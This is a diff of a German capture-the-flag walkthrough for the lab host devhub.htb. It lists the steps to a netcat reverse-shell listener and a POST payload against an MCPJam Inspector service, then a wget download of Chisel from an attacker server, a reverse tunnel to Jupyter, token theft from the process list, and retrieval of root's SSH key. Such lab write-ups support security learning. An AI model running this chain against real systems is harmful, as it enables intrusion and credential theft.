@@ -21,7 +21,6 @@ Ergebnis:
     Port 6274 (MCPJam Inspector)
 
 📌 2. Hosts-Datei anpassen
-bash
 
 echo "10.x.x.x devhub.htb" >> /etc/hosts
 
@@ -34,12 +33,10 @@ echo "10.x.x.x devhub.htb" >> /etc/hosts
 📌 4. Reverse Shell als mcp-dev
 
 Terminal 1 – Listener:
-bash
 
 nc -lvnp 4444
 
 Terminal 2 – Payload:
-bash
 
 curl -X POST http://devhub.htb:6274/api/mcp/connect \
   -H "Content-Type: application/json" \
@@ -49,31 +46,26 @@ curl -X POST http://devhub.htb:6274/api/mcp/connect \
 📌 5. Chisel Tunnel einrichten
 
 HTTP-Server (Angreifer):
-bash
 
 python3 -m http.server 8000 --bind 10.x.x.x
 
 Chisel auf Ziel herunterladen (mcp-dev-Shell):
-bash
 
 cd /tmp
 wget http://10.x.x.x:8000/chisel
 chmod +x chisel
 
 Chisel-Server (Angreifer):
-bash
 
 ./chisel server --reverse --port 9001
 
 Chisel-Client (mcp-dev-Shell):
-bash
 
 ./chisel client 10.x.x.x:9001 R:8888:127.0.0.1:8888 &
 
 📌 6. Jupyter Zugriff
 
 Token auslesen (mcp-dev-Shell):
-bash
 
 ps aux | grep jupyter | grep -v grep
 
@@ -81,7 +73,6 @@ Token: a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2xxxxxxxxxx
 
 Browser: http://localhost:8888/?token=...
 📌 7. Root-SSH-Key abrufen (in Jupyter)
-python
 
 import requests, json
 
@@ -93,7 +84,6 @@ response = requests.post(url, headers=headers, json=payload)
 print(json.dumps(response.json(), indent=2))
 
 📌 8. Root einloggen
-bash
 
 nano root_key
 # Key einfügen
@@ -101,24 +91,18 @@ chmod 600 root_key
 ssh -i root_key root@devhub.htb
 
 📌 9. Flags
-bash
 
 cat /root/root.txt 
 cat /home/analyst/user.txt
 
 Root-Flag:
-text
 
 08be4cfb68597d0f9edfccxxxxxxxxxx
 
-🔗 Links
 
-    CVE-2026-23744
-
-    Chisel
 
 Viel Erfolg! 🚀
-text
+
 
 
 ---
